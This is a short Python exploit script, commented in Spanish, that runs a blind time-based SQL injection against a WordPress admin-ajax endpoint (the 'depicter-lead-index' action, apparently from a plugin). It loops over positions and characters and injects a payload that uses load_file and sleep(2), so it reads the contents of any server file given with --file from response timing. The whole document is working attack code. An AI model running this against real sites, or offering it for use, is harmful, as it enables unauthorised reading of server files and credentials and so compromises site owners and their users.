#!/usr/bin/python3

# librari
import requests, time, sys, signal, string, argparse
from pwn import *

# Force Exit
def def_handler(sig, frame):
    print(f"\n\n[!] Saliendo ....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Parametros
parser = argparse.ArgumentParser(description='Brute Force Ximai')
parser.add_argument("--url", "-u", help="define url", required=True)
parser.add_argument("--file", "-f", help="define file", required=True)
args = parser.parse_args()

main_url= args.url + "/wp-admin/admin-ajax.php?s=9999"
headers = {
    "Host":"wordpress.local:8000",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0",
}
strings = string.ascii_letters + string.digits + "_+-'.,"
stringsPasword = string.printable

def sqli():

    data = ""
    p1 = log.progress("Data")

    time.sleep(2)

    for position in range(1, 150):
        for letter in stringsPasword:
            payload = "') and (select 123 from (select if(substring((select group_concat(load_file('%s'))),%d,1)='%s',sleep(2),0))x) -- -&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index" % (args.file, position, letter, )
            url_inyection = main_url + payload

            time_start = time.time()
            r = requests.get(url=url_inyection, headers=headers)
            time_end = time.time()
            total_time = time_end - time_start

            if total_time > 2:
                data += letter
                p1.status(data)
                break

def main():
    sqli()

if __name__ == "__main__":
    main()
